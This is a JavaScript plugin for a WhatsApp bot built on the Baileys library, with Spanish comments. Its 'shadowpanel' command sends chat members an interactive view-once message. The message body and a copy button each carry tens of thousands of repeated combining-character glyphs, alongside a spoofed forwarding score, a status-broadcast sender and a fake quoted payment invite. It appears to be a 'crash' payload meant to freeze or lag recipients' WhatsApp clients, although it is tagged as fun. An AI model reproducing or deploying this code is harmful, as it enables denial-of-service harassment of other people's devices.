import { generateWAMessageFromContent } from '@whiskeysockets/baileys'

let handler = async (m, { conn }) => {
  // texto cargado que se muestra en el body
  let cargaTexto = "i ᡃ⃝ᡃ⃝ᡃ⃝...".repeat(5000) + " ...".repeat(5000)

  const content = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            isForwarded: true,
            forwardingScore: 1973,
            businessMessageForwardInfo: {
              businessOwnerJid: conn.user.jid,
            },
            participant: conn.user.jid,
            remoteJid: "status@broadcast",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: "UPI",
                expiryTimestamp: Date.now(),
              },
            },
          },
          header: {
            title: "🎄 Shadow-BOT-MD Panel",
            hasMediaAttachment: false,
          },
          body: {
            text: cargaTexto,
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Canal Oficial 💚",
                  url: "https://www.whatsapp.com/android",
                }),
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "📋 Copiar Carga Interactiva",
                  id: "shadow-copy",
                  copy_code: cargaTexto
                }),
              },
            ],
          },
        },
      },
    },
  }

  const msg = generateWAMessageFromContent(m.chat, content, { userJid: m.sender })
  await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}

handler.help = ['shadowpanel']
handler.tags = ['fun']
handler.command = ['shadowpanel']
handler.register = true

export default handler
